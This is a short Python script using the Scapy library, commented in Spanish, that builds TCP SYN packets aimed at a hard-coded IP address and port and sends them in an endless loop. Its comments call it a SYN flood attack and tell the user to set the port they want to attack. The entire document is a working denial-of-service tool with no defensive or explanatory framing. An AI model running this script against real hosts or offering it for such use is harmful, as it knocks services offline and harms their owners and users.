from scapy.all import *

target_ip = "192.223.26.251"  # Cambia esto a la IP de tu servidor
target_port = 2327  # Cambia esto al puerto que deseas atacar

# Crea un paquete SYN
packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")

# Envía múltiples paquetes SYN (ataque SYN Flood)
send(packet, loop=True, inter=0.1)
